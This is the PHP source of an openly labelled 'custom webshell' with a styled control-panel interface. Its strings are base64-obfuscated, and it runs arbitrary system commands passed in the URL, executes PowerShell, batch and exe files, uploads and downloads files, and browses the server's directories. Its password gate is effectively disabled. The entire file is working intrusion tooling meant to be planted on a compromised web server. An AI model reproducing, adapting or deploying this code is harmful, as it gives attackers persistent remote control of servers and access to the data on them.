<!-- 
#̷𝓍   𝓐𝓡𝓢 𝓢𝓒𝓡𝓘𝓟𝓣𝓤𝓜 
#̷𝓍   custom webshell
-->


<?php         $t0=''; 
        global $h1;
        global $x2;
    if($t0 != null) {
        if (isset($_COOKIE[base64_decode('cGFzcw==')])) {                         if (hash(base64_decode('c2hhNTEy'), $_COOKIE[base64_decode('cGFzcw==')]) !== $t0) {
                echo base64_decode('V3JvbmcgcGFzc3dvcmQgIQ==');
                exit;
            }
        } else {
            echo base64_decode('V3JvbmcgcGFzc3dvcmQgIQ==');
            exit;
        }
    }

    function getAbsolute(string $z3): string
    {
                $z3 = mb_ereg_replace(base64_decode('XFxcXHwv'), base64_decode('Lw=='), $z3, base64_decode('bXNy'));
                $r4 = $z3[0] === base64_decode('Lw==');
                preg_match(base64_decode('L15bYS16XTov'), $z3, $b5);
        $g6 = isset($b5[0]) ? $b5[0] : false;
                $b7 = array_filter(explode(base64_decode('Lw=='), $z3), base64_decode('bWJfc3RybGVu'));

        $u8 = [];
        foreach ($b7 as $a9) {
            if (base64_decode('Lg==') === $a9) {
                continue;
            }
                                                            if (base64_decode('Li4=') === $a9
                && !$r4
                && !$g6
                && empty(array_filter($u8, function ($za) { return !(base64_decode('Li4=') === $za); }))
            ) {
                $u8[] = $a9;
                continue;
            }
            if (base64_decode('Li4=') === $a9) {
                array_pop($u8);
                continue;
            }
            $u8[] = $a9;
        }

        return
            (($r4 ? base64_decode('Lw==') : $g6) ?
                $g6.base64_decode('Lw==') : ''
            ).implode(base64_decode('Lw=='), $u8);
    }

        if (isset($_POST[base64_decode('dXBsb2Fk')])) {
        $hb = getDir();
        $nc = $hb.base64_decode('Lw==').basename($_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')]);

        if (file_exists($nc)) {
            echo base64_decode('PHNjcmlwdD5hbGVydCgnRXJyb3I6IEZpbGUgYWxyZWFkeSBleGlzdHMgIScpPC9zY3JpcHQ+');
        }
        else if (move_uploaded_file($_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')], $nc)) {
            echo base64_decode('PHNjcmlwdD5hbGVydCgnRmlsZSB1cGxvYWRlZCBzdWNjZXNzZnVseSAhJyk8L3NjcmlwdD4=');
        } else {
            echo base64_decode('PHNjcmlwdD5hbGVydCgnRXJyb3I6IENvdWxkIG5vdCB1cGxvYWQgZmlsZSAhJyk8L3NjcmlwdD4=');
        }
    
    }
    else if (isset($_GET[base64_decode('cnVuc2NyaXB0')])) {
        $cd = $_GET[base64_decode('cnVuc2NyaXB0')];
        $ie = getAbsolute($cd);
        $jf = base64_decode('cHdzaCAtTm9uaSAtTm9wIC1GaWxlICI=') . $ie . base64_decode('Ig==');
        global $h1;
        global $x2;
        $h1 = shell_exec($jf);
    }
    else if (isset($_GET[base64_decode('cnVuZXhl')])) {
        $cd = $_GET[base64_decode('cnVuZXhl')];
        $ie = getAbsolute($cd);
        $jf = $ie;
        exec(base64_decode('Y2Qg').realpath(getDir()).base64_decode('ICYmIA==').$ie, $h1, $x2);
    }
    else if (isset($_GET[base64_decode('cnVuYmF0')])) {
        $cd = $_GET[base64_decode('cnVuYmF0')];
        $ie = getAbsolute($cd);
        $jf = base64_decode('cHdzaCAtTm9uaSAtTm9wIC1Db21tYW5kIHsgU3RhcnQtUHJvY2VzcyAiY21kLmV4ZSIgLUFyZ3VtZW50TGlzdCBAKCIvayIsIg==') . $ie . base64_decode('KSB9');
        exec(base64_decode('Y2Qg').realpath(getDir()).base64_decode('ICYmIA==').$ie, $h1, $x2);
    }
    
        if (isset($_GET[base64_decode('ZG93bmxvYWQ=')])) {
        $a10 = $_GET[base64_decode('ZG93bmxvYWQ=')];
        if (file_exists($a10)) {
            if (is_readable($a10)) {
                header(base64_decode('Q29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2Zlcg=='));
                header(base64_decode('Q29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0='));
                header(base64_decode('Q29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Ig==').basename($a10).base64_decode('Ig=='));
                header(base64_decode('RXhwaXJlczogMA=='));
                header(base64_decode('Q2FjaGUtQ29udHJvbDogbXVzdC1yZXZhbGlkYXRl'));
                header(base64_decode('UHJhZ21hOiBwdWJsaWM='));
                header(base64_decode('Q29udGVudC1MZW5ndGg6IA==').filesize($a10));
                readfile($a10);
                exit;
            } else {
                echo base64_decode('PHNjcmlwdD5hbGVydCgnRXJyb3I6IENvdWxkIG5vdCByZWFkIHRoZSBmaWxlICEnKTwvc2NyaXB0Pg==');
                exit;
            }
        }
    }

    function getHeaderColor(){
        return base64_decode('cmdiKDMyLCAwLCAxMjgp');
    }
    function getPrimaryColor(){
        return base64_decode('IzAwZmYwMA==');
    }
    function getSecondaryColor(){
        return base64_decode('I2Q5MjYyNg==');
    }
    function getCommandColor(){
        return base64_decode('I2ZmMDA2Ng==');
    }
    function getCommandOutputColor(){
        return base64_decode('IzNBREYwMA==');
    }
    function getExplorerColor(){
        return base64_decode('IzNBREYwMA==');
    }
    function getDirectoryColor(){
        return base64_decode('IzNBREYwMA==');
    }
    function getNavTextColor(){
        return base64_decode('I2ZmNTUwMA==');
    }
    function getHeaderTextColor(){
        return base64_decode('I0MwQzBDMA==');
    }
    function getNavTextHoverColor(){
        return base64_decode('I0MwQzBDMA==');
    }
    function getButtonsColor(){
        return base64_decode('IzNBREYwMA==');
    }
    function getBgColor($h11){
        switch ($h11) {
          case 1:
            return base64_decode('IzEwMTAxMA==');
            break;
          case 2:
            return base64_decode('IzIwMjAyMA==');
            break;
          case 3:
            return base64_decode('IzMwMzAzMA==');
            break;
          case 4:
            return base64_decode('IzQwNDA0MA==');
            break;
          default:
            return base64_decode('IzQwNDA0MA==');
        }
        return base64_decode('IzQwNDA0MA==');
    }
    function fileExtension($m12) {
        $s13 = strrpos($m12, base64_decode('Lg=='));
        return ($s13 === false) ? '' : substr($m12, $s13+1);
    }
    function getItemSize($s14) {
        $x2 =  '';
        $u15 = getDir().base64_decode('Lw==').$s14;
        if (is_dir($u15)){  
            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getDirectoryColor() . base64_decode('Ij4=');
            $x2 .= htmlspecialchars(base64_decode('PGRpcj4='));
        }
        else{
            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getSecondaryColor() . base64_decode('Ij4=');
            $t16 = formatSizeUnits(filesize($u15));
            $x2 .= $t16;
        }
        $x2 .= base64_decode('PC90ZD4=');
        return $x2;
    }
    function getItemActions($s14) {
        $x2 =  '';
        $m17 = pathinfo($s14, PATHINFO_EXTENSION);
        switch ($m17) {
          case base64_decode('cHMx'):
            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getSecondaryColor() . base64_decode('Ij4=');
            $x2 .= makeRunScriptFile($s14);
            break;
          case base64_decode('YmF0'):
            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getSecondaryColor() . base64_decode('Ij4=');
            $x2 .= makeRunBatFile($s14);
            break;
          case base64_decode('ZXhl'):
            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getSecondaryColor() . base64_decode('Ij4=');
            $x2 .= makeRunExeFile($s14);
            break;
          default:
            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getSecondaryColor() . base64_decode('Ij4=');
            $x2 .= htmlspecialchars(base64_decode('bm9vcA=='));
        }
        $x2 .= base64_decode('PC90ZD4=');
        return $x2;
    }
    function printPerms($a10) {
        $r18 = fileperms($a10);
        if( $r18 & 0x1000 ) { $k19=base64_decode('cA=='); }
        else if( $r18 & 0x2000 ) { $k19=base64_decode('Yw=='); }
        else if( $r18 & 0x4000 ) { $k19=base64_decode('ZA=='); }
        else if( $r18 & 0x6000 ) { $k19=base64_decode('Yg=='); }
        else if( $r18 & 0x8000 ) { $k19=base64_decode('LQ=='); }
        else if( $r18 & 0xA000 ) { $k19=base64_decode('bA=='); }
        else if( $r18 & 0xC000 ) { $k19=base64_decode('cw=='); }
        else $k19=base64_decode('dQ==');
        $x1a[base64_decode('cmVhZA==')] = ($r18 & 00400) ? base64_decode('cg==') : base64_decode('LQ==');
        $x1a[base64_decode('d3JpdGU=')] = ($r18 & 00200) ? base64_decode('dw==') : base64_decode('LQ==');
        $x1a[base64_decode('ZXhlY3V0ZQ==')] = ($r18 & 00100) ? base64_decode('eA==') : base64_decode('LQ==');
        $s1b[base64_decode('cmVhZA==')] = ($r18 & 00040) ? base64_decode('cg==') : base64_decode('LQ==');
        $s1b[base64_decode('d3JpdGU=')] = ($r18 & 00020) ? base64_decode('dw==') : base64_decode('LQ==');
        $s1b[base64_decode('ZXhlY3V0ZQ==')] = ($r18 & 00010) ? base64_decode('eA==') : base64_decode('LQ==');
        $z1c[base64_decode('cmVhZA==')] = ($r18 & 00004) ? base64_decode('cg==') : base64_decode('LQ==');
        $z1c[base64_decode('d3JpdGU=')] = ($r18 & 00002) ? base64_decode('dw==') : base64_decode('LQ==');
        $z1c[base64_decode('ZXhlY3V0ZQ==')] = ($r18 & 00001) ? base64_decode('eA==') : base64_decode('LQ==');
        if( $r18 & 0x800 ) $x1a[base64_decode('ZXhlY3V0ZQ==')] = ($x1a[base64_decode('ZXhlY3V0ZQ==')]==base64_decode('eA==')) ? base64_decode('cw==') : base64_decode('Uw==');
        if( $r18 & 0x400 ) $s1b[base64_decode('ZXhlY3V0ZQ==')] = ($s1b[base64_decode('ZXhlY3V0ZQ==')]==base64_decode('eA==')) ? base64_decode('cw==') : base64_decode('Uw==');
        if( $r18 & 0x200 ) $z1c[base64_decode('ZXhlY3V0ZQ==')] = ($z1c[base64_decode('ZXhlY3V0ZQ==')]==base64_decode('eA==')) ? base64_decode('dA==') : base64_decode('VA==');
        $h1d=sprintf(base64_decode('JTFz'), $k19);
        $h1d.=sprintf(base64_decode('JTFzJTFzJTFz'), $x1a[base64_decode('cmVhZA==')], $x1a[base64_decode('d3JpdGU=')], $x1a[base64_decode('ZXhlY3V0ZQ==')]);
        $h1d.=sprintf(base64_decode('JTFzJTFzJTFz'), $s1b[base64_decode('cmVhZA==')], $s1b[base64_decode('d3JpdGU=')], $s1b[base64_decode('ZXhlY3V0ZQ==')]);
        $h1d.=sprintf(base64_decode('JTFzJTFzJTFz'), $z1c[base64_decode('cmVhZA==')], $z1c[base64_decode('d3JpdGU=')], $z1c[base64_decode('ZXhlY3V0ZQ==')]);
        return $h1d;
    }

    function formatSizeUnits($n1e) {
        if ($n1e >= 1073741824)
        {
            $n1e = number_format($n1e / 1073741824, 2) . base64_decode('IEdC');
        }
        elseif ($n1e >= 1048576)
        {
            $n1e = number_format($n1e / 1048576, 2) . base64_decode('IE1C');
        }
        elseif ($n1e >= 1024)
        {
            $n1e = number_format($n1e / 1024, 2) . base64_decode('IEtC');
        }
        elseif ($n1e > 1)
        {
            $n1e = $n1e . base64_decode('IGJ5dGVz');
        }
        elseif ($n1e == 1)
        {
            $n1e = $n1e . base64_decode('IGJ5dGU=');
        }
        else
        {
            $n1e = base64_decode('MCBieXRlcw==');
        }

        return $n1e;
    }


    function getDir() {
        return isset($_GET[base64_decode('ZGly')]) ? realpath($_GET[base64_decode('ZGly')]) : getcwd();
    }


    function makeFileName($a10) {
        if (is_dir(getDir().base64_decode('Lw==').$a10)) {
            return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P2Rpcj0=').realpath(getDir().base64_decode('Lw==').$a10).base64_decode('Ij4=').$a10.base64_decode('PC9hPg==');
        } else {
            return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P2Rvd25sb2FkPQ==').realpath(getDir().base64_decode('Lw==').$a10).base64_decode('Ij4=').$a10.base64_decode('PC9hPg==');
        }
    }
    function makeRunScriptFile($a10) {
        return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P3J1bnNjcmlwdD0=').getAbsolute(getDir().base64_decode('Lw==').$a10).base64_decode('JmRpcj0=').realpath(getDir()) . base64_decode('Ij4=').base64_decode('cnVuPC9hPg==');
    }
    function makeRunExeFile($a10) {
        return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P3J1bmV4ZT0=').getAbsolute(getDir().base64_decode('Lw==').$a10).base64_decode('JmRpcj0=').realpath(getDir()) . base64_decode('Ij4=').base64_decode('cnVuPC9hPg==');
    }
    function makeRunBatFile($a10) {
        return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P3J1bmJhdD0=').getAbsolute(getDir().base64_decode('Lw==').$a10).base64_decode('JmRpcj0=').realpath(getDir()) . base64_decode('Ij4=').base64_decode('cnVuPC9hPg==');
    }
    function getFiles() {
        $b1f = scandir(getDir());

        $z20 = true;
        if ($b1f != null) {
            foreach($b1f as $s14){
                                echo base64_decode('PHRyIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOg==').($z20  ? base64_decode('IzUxNTE1MQ==') : base64_decode('IzIxMjEyMQ==')).base64_decode('OyI+');
                echo base64_decode('PHRkIHN0eWxlPSJmb250LXdlaWdodDp0aGluOyI+').makeFileName($s14).base64_decode('PC90ZD4='); 
                                                echo ''.getItemSize($s14).'';
                echo ''.getItemActions($s14).'';
                echo base64_decode('PC90cj4=');
                $z20 = !$z20;
            }
        } else {
            echo base64_decode('PHA+Q291bGRuJ3Qgb3BlbiB0aGF0IGRpcmVjdG9yeSAh');
        }
    }

    function getCmdResults() {
        global $h1;
        global $x2;
        
        if ($x2 == 0 ) {
            if($h1 != null){
                foreach ($h1 as $j21) {

                    if($j21 != null){
                        echo base64_decode('PGJyPg==');
                        echo htmlspecialchars($j21);
                        echo base64_decode('Cg==');
                        
                    }
                }
            }
        } else {
            echo base64_decode('RXhlY3V0aW9uIGZhaWxlZCB3aXRoIGVycm9yIGNvZGU6IA==').$x2;
        }    
    }

    function getCommandLine() {
        $q22 = gethostname() ?? base64_decode('bm9uZQ==');
        $g23 = get_current_user();
        $h24 = getDir();
        $j25 = isset($_GET[base64_decode('Y21k')]) ? $_GET[base64_decode('Y21k')] : '';

        return base64_decode('PHNwYW4gc3R5bGU9ImNvbG9yOiAjZmY2MzQ3Ij4=').$g23.base64_decode('QA==').$q22.base64_decode('PC9zcGFuPjogPHNwYW4gc3R5bGU9ImNvbG9yOiAjQjQwNDA0Ij4=').$h24.base64_decode('PC9zcGFuPiQg').$j25;
    }

    if (isset($_GET[base64_decode('Y21k')])) {
        exec(base64_decode('Y2Qg').realpath(getDir()).base64_decode('ICYmIA==').$_GET[base64_decode('Y21k')], $h1, $x2);
    }
?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>My WebShell</title>
        
        <script>
            function changeDir() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>
        <style>
            :root {
                --header-color: <?php echo getHeaderColor();?>;
                --background-color-1: <?php echo getBgColor(1);?>;
                --background-color-2: <?php echo getBgColor(2);?>;
                --background-color-3: <?php echo getBgColor(3);?>;
                --background-color-4: <?php echo getBgColor(4);?>;
                --primary-color: <?php echo getPrimaryColor();?>;
                --secondary-color: <?php echo getSecondaryColor();?>;
                --command-color: <?php echo getCommandColor();?>;
                --commandoutput-color: <?php echo getCommandOutputColor();?>;
                --explorer-color: <?php echo getExplorerColor();?>;
                --directory-color: <?php echo getDirectoryColor();?>;
                --navtext-color: <?php echo getNavTextColor();?>;
                --navtext-hover-color: <?php echo getNavTextHoverColor();?>;
                --header-text-color: <?php echo getHeaderTextColor();?>;
                --buttons-color: <?php echo getButtonsColor();?>;
            }
        </style>
        <script>
            const popupHtmlUploadFile = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlRunPowerShellScript = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a script to run...</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="runpwsh" name="runpwsh">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function showUploadPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlUploadFile + bodyHTML;
            }
            function showRunScriptPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlRunPowerShellScript + bodyHTML;
            }
            function hidePopup() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1>> control panel</h1>
                <div class="nav-items">
                    <a onclick="showUploadPopup()">[upload]</a>
                    <a onclick="changeDir()">[cd]</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo getDir()?></h4>
                <table>
                    <tr style="background-color:var(--header-color);">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <!--<th>Owner</th>
                        //<th>Permissions</th> -->
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                    <?php getFiles()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo getCommandLine()?></p>
                    <p><?php getCmdResults()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo getDir()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>



            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--header-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: var(--header-text-color);
                font-family: 'Consolas', monospace;
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 24px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: var(--navtext-color);
                font-size: 12px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color:  var(--navtext-hover-color);
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;      
                color:  rgb(0, 128, 255);
                font-family: 'Consolas', monospace;
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                color: var(--explorer-color);
                font-family: 'Consolas', monospace;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 12px;
                color: var(--explorer-color);
            }

            .explorer-panel table {font-size
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: auto;
                color: hsl(30, 100%, 50%);
                background-color: var(--background-color-2);
                font-size: 12px;
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
                font-size: 12px;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                color: var(--command-color);
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
                font-size: 8px;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                font-family: 'Consolas', monospace;
                color: var(--commandoutput-color);
            }

            .command-output p {
                margin: 0px;
                font-family: 'Consolas', monospace;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: var(--command-color);
                font-size: 12px;
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: var(--buttons-color);
                font-family: 'Consolas', monospace;
                font-size: 12px;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>



